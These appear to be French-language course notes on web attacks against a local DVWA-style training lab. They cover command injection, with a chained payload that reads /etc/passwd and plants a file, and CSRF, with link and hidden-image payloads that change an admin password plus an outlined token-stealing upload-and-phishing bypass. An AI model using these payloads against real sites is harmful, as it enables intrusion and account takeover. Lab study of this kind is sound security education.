# Rappel 


# injection de Command

formulaire qui propose de saisir un texte => dérrière enfait il y a un terminal qui va exécuter ce que vous avez écrit

=> `shell_exec()`

=> google.fr && ls -al || cat index.php & touch virus.php | cat /etc/passwd ;  

chainage de commande => mettre plusieurs commandes sur 1 seule ligne 

| => commande A | commande B => injectioner l'output de la commande A dans la commande B
|| => commande A || commande B => la commande A ne fonctionne pas alors essaye la commande B
&  => équivalent de && dans le monde de windows 
&& => commande A && commande B => réaliser à 100% la commande A pour passer à la commande B


cat fichier.txt | wc => permet de savoir combien de lignes sont dans le fichier fichier.txt

mkdir exemple && touch exemple/toto.txt


=> la seule vraie solution pour éviter les injections de commande 
=> faire une liste exhaustive de ce qu'il doit être exécutable (white list)



# CSRF

arriver à faire faire une action d'un utilisateur du site (admin)
SANS qu'il s'en rendre compte

l'exo est basé sur une page clé de tout site internet => changer les mots de passe de l'admin

- ouvre page => formulaire 
- changer password + répétition 
- soumission
- http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=titi&password_conf=titi&Change=Change#

- low

=> phishing => envoi un email avec un lien hypertext 
<a href="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=titi&password_conf=titi&Change=Change#">page à modifier</a>

=> créer une balise img html 

<img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=titi&password_conf=titi&Change=Change#" style="display:none">

=> insérer dans une page où on peut mettre des commentaires

- medium

REFERER => entête dans une demande HTTP 
L'idée c'est de vérifier que l'utilisateur A UTILISE le formulaire pour faire la demande

=> créer une balise img html 

<img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=titi&password_conf=titi&Change=Change#" style="display:none">


- high

token / Jeton CSRF 
champ masqué `<input type="hidden">` qui contient un nombre alétoire qui se regénère à chaque ouverte de page 

=> comment détourner ce mécanisme de protection 

- créer un fichier html qui contient 2 requête AJAX 
    - récupérer le token
    - changer le mot de passe 
- prendre ce fichier est l'uploader dans le serveur
- récupérer l'adresse du fichier uploadée 
- envoyer mail de phishing contenant un lien
    - <a href="http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/04-index.html"></a>